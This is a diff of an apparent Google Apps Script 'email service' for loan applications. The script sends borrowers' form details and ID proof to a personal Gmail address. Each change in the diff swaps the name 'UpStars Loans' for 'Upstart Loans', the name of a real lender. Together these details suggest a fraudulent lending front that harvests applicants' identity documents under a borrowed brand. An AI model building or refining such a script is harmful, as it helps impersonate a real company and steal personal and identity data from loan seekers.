@@ -1,4 +1,4 @@
-// Exact Email Format Script for UpStars Loans
+// Exact Email Format Script for Upstart Loans
 // Step 1: Application form details (exact format)
 // Step 2: Agreement with ID proof
 
@@ -8,7 +8,7 @@ const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
-    <h1>UpStars Loans Email Service</h1>
+    <h1>Upstart Loans Email Service</h1>
     <p>Two-step email system ready.</p>
     <p><strong>Current emails:</strong></p>
     <ul>
@@ -94,7 +94,7 @@ function sendAgreementEmail(data) {
     saveIdProofToCustomerDashboard(data);
     
     // Simple agreement email with ID proof
-    const emailBody = "Loan Agreement Submitted - UpStars Loans\n\n" +
+    const emailBody = "Loan Agreement Submitted - Upstart Loans\n\n" +
       "Borrower: " + (data.borrower_name || 'Customer') + "\n" +
       "Email: " + (data.email || 'Not provided') + "\n" +
       "Agreement Number: " + (data.agreementNumber || 'Not provided') + "\n" +
@@ -184,9 +184,9 @@ function calculateMonthlyPayment(loanAmount, loanTerm) {
 }
 
 function sendErrorEmail(error, data) {
-  const subject = 'Error in UpStars Loans System';
+  const subject = 'Error in Upstart Loans System';
   const body = `
-An error occurred in the UpStars Loans system:
+An error occurred in the Upstart Loans system:
 
 Error: ${error}
 
